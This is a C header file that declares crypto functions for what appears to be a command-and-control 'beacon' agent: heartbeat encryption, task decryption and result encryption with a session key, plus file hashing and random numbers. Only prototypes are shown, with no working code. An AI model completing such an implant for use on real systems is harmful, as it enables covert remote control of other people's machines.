#pragma once

#include "beacon_common.h"

#define BEACON_SESSION_KEY_SIZE 16u

INT CryptoRandom(VOID* out, SIZE_T len);
UINT32 CryptoRandomU32(VOID);
INT CryptoSha256File(const WCHAR* path, ByteBuf* digest, UINT64* size_out);
INT CryptoEncryptHeartbeat(const CHAR* root_key, const ByteBuf* plain, ByteBuf* out);
INT CryptoDecryptTask(const BYTE8* session_key, SIZE_T session_key_len, const ByteBuf* env, ByteBuf* out);
INT CryptoEncryptResult(const BYTE8* session_key, SIZE_T session_key_len, const ByteBuf* plain, ByteBuf* out);
